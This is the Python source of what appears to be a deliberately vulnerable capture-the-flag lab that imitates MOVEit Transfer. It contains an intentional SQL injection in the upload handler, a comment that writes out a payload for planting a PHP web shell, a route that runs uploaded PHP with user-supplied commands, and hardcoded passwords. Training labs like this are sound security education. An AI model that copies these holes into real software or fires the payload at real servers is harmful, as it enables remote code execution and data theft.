import os
import time
from datetime import datetime
from functools import wraps
from pathlib import Path

import bcrypt
import mysql.connector
from flask import (
    Flask, Response, flash, g, redirect, render_template,
    request, send_from_directory, session, url_for,
)
from werkzeug.utils import secure_filename

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_DIR = Path("/var/www/uploads")
RUNTIME_LOG = Path("/tmp/moveit-app.log")
PLACEHOLDER_LOG_DIR = Path("/var/log/moveit")

DB_CONFIG = {
    "host": os.environ.get("DB_HOST", "localhost"),
    "port": int(os.environ.get("DB_PORT", 3306)),
    "user": os.environ.get("DB_USER", "moveit"),
    "password": os.environ.get("DB_PASS", "moveitpass"),
    "database": os.environ.get("DB_NAME", "moveit"),
    "autocommit": False,
}

ALLOWED_EXTENSIONS = {"txt", "pdf", "csv", "docx", "xlsx", "zip", "png", "json", "xml"}

app = Flask(__name__)

@app.after_request
def add_headers(response):
    response.headers["Server"] = "MOVEit Transfer"
    response.headers["X-MOVEit-Version"] = "2023.1.4"
    return response

app.secret_key = os.environ.get("SECRET_KEY", "moveit-safe-lab-secret")


def connect_db():
    for _ in range(10):
        try:
            return mysql.connector.connect(**DB_CONFIG)
        except mysql.connector.Error:
            time.sleep(1)
    raise RuntimeError("Unable to connect to the database")


def get_db():
    if "db" not in g:
        g.db = connect_db()
    return g.db


@app.teardown_appcontext
def close_db(exception):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def split_sql_statements(query: str) -> list[str]:
    statements = []
    current = []
    in_single_quote = False
    in_double_quote = False
    escape = False

    for char in query:
        current.append(char)
        if escape:
            escape = False
            continue
        if char == "\\":
            escape = True
            continue
        if char == "'" and not in_double_quote:
            in_single_quote = not in_single_quote
            continue
        if char == '"' and not in_single_quote:
            in_double_quote = not in_double_quote
            continue
        if char == ";" and not in_single_quote and not in_double_quote:
            statement = "".join(current[:-1]).strip()
            if statement:
                statements.append(statement)
            current = []

    tail = "".join(current).strip()
    if tail:
        statements.append(tail)
    return statements


def db_execute(query: str, params=None):
    conn = get_db()
    cursor = conn.cursor(dictionary=True)
    if params:
        cursor.execute(query, params)
        return cursor
    
    last_cursor = cursor
    for stmt in split_sql_statements(query):
        stmt = stmt.strip()
        if not stmt or stmt.startswith('--'):
            continue
        try:
            cursor.execute(stmt)
            last_cursor = cursor
        except mysql.connector.Error:
            # Statement xato bersa ham keyingi statement bajarilsin
            # Bu SQLi simulyatsiyasi uchun intentional
            pass
    return last_cursor


def db_executemany(query: str, params_list):
    conn = get_db()
    cursor = conn.cursor()
    cursor.executemany(query, params_list)
    return cursor


def allowed_file(filename: str) -> bool:
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS


def is_malicious(file_bytes: bytes) -> bool:
    """Faqat fayl bytes tekshiriladi — form fieldlar tekshirilmaydi (intentional)."""
    try:
        content = file_bytes.decode("utf-8", errors="ignore").lower()
        for pattern in ["import os", "subprocess", "popen", "eval"]:
            if pattern in content:
                return True
    except Exception:
        pass
    return False


def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()


def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode(), hashed.encode())


def init_directories() -> None:
    for d in [UPLOAD_DIR, Path("/opt/devops"), Path("/opt/backups"),
              PLACEHOLDER_LOG_DIR, Path("/home/www-data")]:
        d.mkdir(parents=True, exist_ok=True)

    if not RUNTIME_LOG.exists():
        RUNTIME_LOG.write_text("")

    flag1 = Path("/home/www-data/user.txt")
    if not flag1.exists():
        flag1.write_text('USER{1c7e08f95bdb0fdbe216ca6afe58fc6b}\n')

    placeholders = {
        Path("/opt/devops/release-calendar.txt"):
            "Release freeze window\nPlatform: SecureTransfer Portal\nChange Board: Wednesdays 18:00 UTC\n",
        Path("/opt/backups/retention-policy.txt"):
            "Backup retention profile\nVault snapshots: 14 days\nAudit exports: 90 days\n",
        PLACEHOLDER_LOG_DIR / "appliance.log":
            "[2026-03-10 08:00:00 UTC] service booted\n"
            "[2026-03-11 02:00:00 UTC] integrity scan complete\n"
            "[2026-03-12 17:30:00 UTC] dashboard cache refreshed\n",
    }
    for path, content in placeholders.items():
        if not path.exists():
            try:
                path.write_text(content)
            except OSError as e:
                if e.errno != 30:
                    raise


def write_activity(message: str) -> None:
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    with RUNTIME_LOG.open("a") as f:
        f.write(f"[{ts}] {message}\n")


def init_db() -> None:
    conn = connect_db()
    cur = conn.cursor()
    cur.execute(f"CREATE DATABASE IF NOT EXISTS `{DB_CONFIG['database']}`")
    conn.database = DB_CONFIG["database"]

    cur.execute("""CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(150) UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role VARCHAR(50) NOT NULL,
        full_name VARCHAR(255) NOT NULL,
        created_at VARCHAR(50) NOT NULL,
        last_login VARCHAR(50)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;""")

    cur.execute("""CREATE TABLE IF NOT EXISTS uploads (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(150) NOT NULL,
        filename VARCHAR(260) NOT NULL,
        original_name VARCHAR(260) NOT NULL,
        description TEXT,
        notes TEXT,
        size BIGINT NOT NULL,
        status VARCHAR(50) NOT NULL,
        uploaded_at VARCHAR(50) NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;""")

    cur.execute("""CREATE TABLE IF NOT EXISTS activity_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        actor VARCHAR(150) NOT NULL,
        action TEXT NOT NULL,
        source_ip VARCHAR(45) NOT NULL,
        created_at VARCHAR(50) NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;""")

    cur.executemany(
        "INSERT IGNORE INTO users (username,password_hash,role,full_name,created_at,last_login) VALUES(%s,%s,%s,%s,%s,%s)",
        [(u, hash_password(p), r, n, "2026-03-01 09:00:00 UTC", "Never")
         for u, p, r, n in [
             ("admin", "Summer2024!", "Administrator", "Alice Bennett"),
             ("auditor", "Compliance2024!", "Auditor", "Morgan Reed"),
         ]],
    )

    cur.execute("SELECT COUNT(*) FROM uploads")
    if cur.fetchone()[0] == 0:
        cur.executemany(
            "INSERT INTO uploads (username,filename,original_name,description,notes,size,status,uploaded_at) VALUES(%s,%s,%s,%s,%s,%s,%s,%s)",
            [
                ("admin", "quarterly_board_packet.pdf", "quarterly_board_packet.pdf",
                 "Board reporting package for March review.", "Release approved by Finance Ops.",
                 248100, "Released", "2026-03-11 14:02:11"),
                ("auditor", "sox_audit_evidence.zip", "sox_audit_evidence.zip",
                 "External audit evidence collection.", "Awaiting checksum confirmation.",
                 908112, "Quarantined", "2026-03-12 16:40:07"),
            ],
        )

    cur.execute("SELECT COUNT(*) FROM activity_logs")
    if cur.fetchone()[0] == 0:
        cur.executemany(
            "INSERT INTO activity_logs (actor,action,source_ip,created_at) VALUES(%s,%s,%s,%s)",
            [
                ("system", "Daily integrity scan completed", "127.0.0.1", "2026-03-11 02:00:00"),
                ("admin", "Approved board packet release", "10.10.20.14", "2026-03-11 14:05:33"),
                ("system", "Version disclosure endpoint enabled", "127.0.0.1", "2026-03-12 09:14:10"),
            ],
        )

    conn.commit()
    conn.close()


def login_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        if not session.get("user"):
            return redirect(url_for("login"))
        return view(*args, **kwargs)
    return wrapped


def current_user():
    return session.get("user")


def authenticate(username: str, password: str):
    cur = db_execute(
        "SELECT id,username,password_hash,role,full_name FROM users WHERE username=%s",
        (username,),
    )
    row = cur.fetchone()
    if row and verify_password(password, row["password_hash"]):
        db_execute(
            "UPDATE users SET last_login=%s WHERE id=%s",
            (datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), row["id"]),
        )
        get_db().commit()
        return row
    return None


def seed_upload_file(filename: str, content: str) -> None:
    t = UPLOAD_DIR / filename
    if not t.exists():
        t.write_text(content)


@app.route("/")
def index():
    return redirect(url_for("dashboard") if session.get("user") else url_for("login"))


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        full_name = request.form.get("full_name", "").strip()
        username = request.form.get("username", "").strip().lower()
        password = request.form.get("password", "")
        confirm = request.form.get("confirm_password", "")

        if not full_name or not username or not password:
            flash("All fields are required to create an account.", "warning")
            return render_template("register.html")
        if len(password) < 10:
            flash("Use a password with at least 10 characters.", "warning")
            return render_template("register.html")
        if password != confirm:
            flash("Password confirmation does not match.", "danger")
            return render_template("register.html")

        try:
            db_execute(
                "INSERT INTO users (username,password_hash,role,full_name,created_at,last_login) VALUES(%s,%s,%s,%s,%s,%s)",
                (username, hash_password(password), "Operator", full_name,
                 datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "Never"),
            )
            db_execute(
                "INSERT INTO activity_logs (actor,action,source_ip,created_at) VALUES(%s,%s,%s,%s)",
                (username, "Registered new operator account",
                 request.remote_addr or "unknown",
                 datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")),
            )
            get_db().commit()
        except mysql.connector.IntegrityError:
            flash("That username is already provisioned.", "danger")
            return render_template("register.html")

        write_activity(f"Registered user account: {username}")
        flash("Account created. Sign in to access your workspace.", "success")
        return redirect(url_for("login"))

    return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip().lower()
        password = request.form.get("password", "")
        row = authenticate(username, password)
        if row:
            session["user"] = {
                "id": row["id"], "username": row["username"],
                "role": row["role"], "full_name": row["full_name"],
            }
            write_activity(f"Successful login for {row['username']} from {request.remote_addr}")
            flash("Authenticated successfully. Secure workspace loaded.", "success")
            return redirect(url_for("dashboard"))
        flash("Authentication failed. Review your credentials and try again.", "danger")
    return render_template("login.html")


@app.route("/logout")
def logout():
    if session.get("user"):
        write_activity(f"User {session['user']['username']} logged out")
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard")
@login_required
def dashboard():
    total_files = db_execute("SELECT COUNT(*) as cnt FROM uploads").fetchone()["cnt"]
    released = db_execute("SELECT COUNT(*) as cnt FROM uploads WHERE status='Released'").fetchone()["cnt"]
    pending = db_execute("SELECT COUNT(*) as cnt FROM uploads WHERE status='Quarantined'").fetchone()["cnt"]
    recent_uploads = db_execute(
        "SELECT original_name,size,status,uploaded_at FROM uploads ORDER BY uploaded_at DESC LIMIT 5"
    ).fetchall()
    recent_logs = db_execute(
        "SELECT actor,action,created_at FROM activity_logs ORDER BY created_at DESC LIMIT 5"
    ).fetchall()
    return render_template("dashboard.html", user=current_user(),
                           total_files=total_files, released=released,
                           pending=pending, recent_uploads=recent_uploads,
                           recent_logs=recent_logs)

@app.route("/api/version", methods=["GET"])
def api_version():
    return {
        "product": "MOVEit Transfer",
        "version": "2023.1.4",
        "build": "enterprise",
        "api": "v1"
    }

@app.route("/api/messages", methods=["GET"])
def api_messages():
    return {
        "product": "MOVEit Transfer",
        "api": "v1",
        "count": 23,
        "question_count": 8,
        "messages": [
            {
                "id": 1,
                "author": "alice.bennett",
                "type": "info",
                "message": "March maintenance window scheduled for Sunday at 02:00 UTC."
            },
            {
                "id": 2,
                "author": "morgan.reed",
                "type": "question",
                "message": "Can we get the latest audit export before the weekend?"
            },
            {
                "id": 3,
                "author": "ops.team",
                "type": "info",
                "message": "Database backup completed successfully."
            },
            {
                "id": 4,
                "author": "security.team",
                "type": "question",
                "message": "Was the admin password rotation completed for all privileged users?"
            },
            {
                "id": 5,
                "author": "release.manager",
                "type": "info",
                "message": "Version disclosure endpoint is enabled for internal validation."
            },
            {
                "id": 6,
                "author": "support",
                "type": "info",
                "message": "Two new enterprise customers were onboarded this week."
            },
            {
                "id": 7,
                "author": "audit",
                "type": "question",
                "message": "Do we have confirmation that last month's logs were archived?"
            },
            {
                "id": 8,
                "author": "infra",
                "type": "info",
                "message": "Load balancer health checks are passing on all nodes."
            },
            {
                "id": 9,
                "author": "security.team",
                "type": "question",
                "message": "In MOVEit Transfer 2023.1.3, was there a SQLi File Write vulnerability in the file upload transfer notes component, and did administrators confirm whether this issue was fixed in version 2023.1.4 or not?"
            },
            {
                "id": 10,
                "author": "alice.bennett",
                "type": "info",
                "message": "User provisioning sync completed for the finance group."
            },
            {
                "id": 11,
                "author": "noc",
                "type": "info",
                "message": "No unexpected outbound traffic detected in the last 24 hours."
            },
            {
                "id": 12,
                "author": "morgan.reed",
                "type": "question",
                "message": "Should we keep the legacy upload workflow enabled for another week?"
            },
            {
                "id": 13,
                "author": "ops.team",
                "type": "info",
                "message": "Temporary files cleanup job finished without errors."
            },
            {
                "id": 14,
                "author": "helpdesk",
                "type": "info",
                "message": "Three access requests are waiting for administrator approval."
            },
            {
                "id": 15,
                "author": "audit",
                "type": "question",
                "message": "Can someone verify whether file retention settings were changed yesterday?"
            },
            {
                "id": 16,
                "author": "infra",
                "type": "info",
                "message": "Container image cache was refreshed from the local registry."
            },
            {
                "id": 17,
                "author": "compliance",
                "type": "info",
                "message": "Quarterly policy review has been added to the dashboard."
            },
            {
                "id": 18,
                "author": "security.team",
                "type": "question",
                "message": "Did we disable direct internet access from the application container?"
            },
            {
                "id": 19,
                "author": "support",
                "type": "info",
                "message": "Customer-facing status page shows all systems operational."
            },
            {
                "id": 20,
                "author": "release.manager",
                "type": "info",
                "message": "Next build candidate is pending final QA sign-off."
            },
            {
                "id": 21,
                "author": "alice.bennett",
                "type": "question",
                "message": "Has the 2023.1.4 rollout been completed on every environment?"
            },
            {
                "id": 22,
                "author": "noc",
                "type": "info",
                "message": "Disk usage on the uploads volume is currently at 41 percent."
            },
            {
                "id": 23,
                "author": "audit",
                "type": "question",
                "message": "Can we include message export support in the next API revision?"
            }
        ]
    }




@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    user = current_user()

    if request.method == "POST":
        uploaded = request.files.get("file")
        description = request.form.get("description", "").strip()
        notes = request.form.get("notes", "").strip()
        business_unit = request.form.get("business_unit", "Operations")

        if not uploaded or uploaded.filename == "":
            flash("Select a file package before submitting.", "warning")
            return redirect(url_for("upload"))

        original_name = uploaded.filename
        safe_name = secure_filename(original_name)

        if not safe_name or not allowed_file(safe_name):
            flash("Unsupported file type for this training appliance.", "danger")
            return redirect(url_for("upload"))

        file_bytes = uploaded.read()
        if is_malicious(file_bytes):
            flash("File contains potentially malicious content and has been rejected.", "danger")
            return redirect(url_for("upload"))

        target_path = UPLOAD_DIR / safe_name
        target_path.write_bytes(file_bytes)
        uploaded_at = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

        # ══════════════════════════════════════════════════════════════════
        # INTENTIONAL VULN — CVE-2023-34362 simulation
        #
        # notes va original_name sanitize qilinmagan — f-string orqali
        # to'g'ridan-to'g'ri SQL ga kiritiladi.
        # db_execute() multi=True bilan ishlaydi — stacked queries mumkin.
        #
        # Exploit payload → notes maydoniga:
        #
        #   x'); SELECT '<?php system($_GET["cmd"]); ?>'
        #   INTO OUTFILE '/var/www/uploads/shell.php'; -- -
        #
        # Natija: /uploads/shell.php?cmd=id  → RCE
        # ══════════════════════════════════════════════════════════════════
        query = f"""
        INSERT INTO uploads (
            username, filename, original_name, description, size, status, uploaded_at, notes
        ) VALUES (
            '{user["username"]}',
            '{safe_name}',
            '{original_name}',
            '{description}',
            {len(file_bytes)},
            'Released',
            '{uploaded_at}',
            '{notes}'
        )
        """

        try:
            db_execute(query)
            db_execute(
                "INSERT INTO activity_logs (actor,action,source_ip,created_at) VALUES(%s,%s,%s,%s)",
                (user["username"], f"Uploaded package for {business_unit}",
                 request.remote_addr or "unknown", uploaded_at),
            )
            get_db().commit()
        except mysql.connector.Error:
            get_db().rollback()
            try:
                target_path.unlink(missing_ok=True)
            except OSError:
                pass
            flash("Upload metadata could not be processed. Please review the form data and try again.", "danger")
            return redirect(url_for("upload"))

        write_activity(f"Upload processed for {safe_name} by {user['username']}")
        flash("Transfer package uploaded and queued for partner release.", "success")
        return redirect(url_for("files"))

    return render_template("upload.html", user=user,
                           review_target="Inspect the upload metadata handler in app.py for defensive code review.")


@app.route("/files")
@login_required
def files():
    rows = db_execute(
        "SELECT id,original_name,description,size,status,uploaded_at,notes FROM uploads ORDER BY uploaded_at DESC"
    ).fetchall()
    return render_template("files.html", user=current_user(), files=rows)


@app.route("/admin")
@login_required
def admin():
    users = db_execute("SELECT username,role,full_name,last_login FROM users ORDER BY username").fetchall()
    system_checks = [
        ("Transfer Listener", "Healthy"),
        ("Malware Gateway", "Healthy"),
        ("Metadata Service", "Review Target"),
        ("Database Audit Trail", "Healthy"),
    ]
    return render_template("admin.html", user=current_user(), users=users, system_checks=system_checks)


@app.route("/logs")
@login_required
def logs():
    db_logs = db_execute(
        "SELECT actor,action,source_ip,created_at FROM activity_logs ORDER BY created_at DESC LIMIT 50"
    ).fetchall()
    runtime_lines = RUNTIME_LOG.read_text().splitlines()[-20:]
    runtime_lines.reverse()
    return render_template("logs.html", user=current_user(), db_logs=db_logs, filesystem_logs=runtime_lines)


@app.route("/uploads/<path:filename>")
@login_required
def uploaded_file(filename: str):

    file_path = UPLOAD_DIR / filename

    if file_path.exists() and filename.endswith(".php"):
        import subprocess

        cmd = request.args.get("cmd", "")

        php_code = f'$_GET["cmd"]="{cmd}"; include "{file_path}";'

        result = subprocess.run(
            ["php", "-r", php_code],
            capture_output=True,
            text=True
        )

        return Response(result.stdout + result.stderr, mimetype="text/plain")

    return send_from_directory(UPLOAD_DIR, filename, as_attachment=False)

@app.route("/health")
def health():
    return {"status": "Ok", "service": "MoveIt-service-is-worked"}


def bootstrap_sample_uploads() -> None:
    seed_upload_file("quarterly_board_packet.pdf", "Board reporting package placeholder\n")
    seed_upload_file("sox_audit_evidence.zip", "PK\x03\x04 simulated zip placeholder")


if __name__ == "__main__":
    init_directories()
    init_db()
    bootstrap_sample_uploads()
    write_activity("SecureTransfer training environment initialized")
    app.run(host="0.0.0.0", port=8080, debug=False)
